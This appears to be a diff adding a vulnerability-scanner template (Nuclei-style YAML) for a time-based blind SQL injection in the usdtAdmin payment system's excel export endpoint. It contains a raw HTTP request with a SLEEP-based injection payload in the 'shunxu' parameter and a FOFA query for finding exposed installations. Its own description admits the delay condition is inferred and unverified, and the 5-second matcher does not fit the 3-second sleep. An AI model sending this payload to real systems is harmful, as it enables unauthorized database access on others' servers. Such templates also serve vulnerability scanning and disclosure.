@@ -1,0 +1,26 @@
+id: poc-ecc5d92ygqiby9fg
+info:
+  name: usdtAdmin收款管理系统excel存在SQL注入漏洞(CNVD-2025-09490)
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ecc5d92ygqiby9fg
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ecc5d92ygqiby9fg
+    fofa: '"/usdtmerchant/login/reg.html"'
+http:
+- raw:
+  - 'GET /index/getway/excel?down=1&table=ea_system_admin&shunxu=desc,(SELECT+(CASE+WHEN+(8968=8968)+THEN+SLEEP(3)+ELSE+8968+END))&number=100 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/6'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
